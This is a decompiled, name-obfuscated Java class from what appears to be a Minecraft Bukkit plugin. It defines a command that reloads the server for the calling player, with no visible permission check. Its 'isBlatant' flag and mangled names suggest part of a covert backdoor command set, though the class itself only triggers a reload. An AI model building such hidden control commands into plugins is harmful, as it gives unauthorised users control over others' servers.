/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class ReloadCommand
extends Command {
    public ReloadCommand() {
        ReloadCommand lllllllllllllIIllIlllIIllIllIIII;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllIIllIlllIIllIlIlIll, String lllllllllllllIIllIlllIIllIlIlIlI, String[] lllllllllllllIIllIlllIIllIlIlIIl, Player lllllllllllllIIllIlllIIllIlIIllI) {
        lllllllllllllIIllIlllIIllIlIIllI.sendMessage(Settings.PREFIX("Reloading the server..."));
        lllllllllllllIIllIlllIIllIlIlIll.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllIIllIlllIIllIlIlIll, () -> Bukkit.getServer().reload());
    }
}

